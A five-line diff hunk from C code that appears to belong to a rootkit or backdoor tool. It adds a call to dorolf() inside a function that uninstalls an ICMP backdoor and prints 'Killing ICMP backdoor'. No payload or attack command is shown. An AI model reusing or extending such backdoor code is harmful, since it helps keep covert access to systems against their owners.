@@ -74,6 +74,7 @@ void uninstallass(void){
 #endif
 
 void uninstallbdv(void){
+    dorolf();
 #ifdef USE_ICMP_BD
     if(pdoorup()){
         printf("Killing ICMP backdoor\n");
